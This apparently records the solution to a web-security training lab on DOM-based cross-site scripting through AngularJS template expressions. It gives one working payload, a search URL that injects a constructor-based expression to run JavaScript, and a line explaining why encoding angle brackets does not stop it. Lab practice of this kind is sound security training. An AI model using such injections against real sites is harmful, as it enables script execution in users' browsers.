# Lab 11 — DOM XSS AngularJS Expression (PRACTITIONER)

## Payload
```
/search?search={{constructor.constructor('alert(1)')()}}
```
AngularJS evaluates `{{ }}` expressions even when `< >` are encoded.
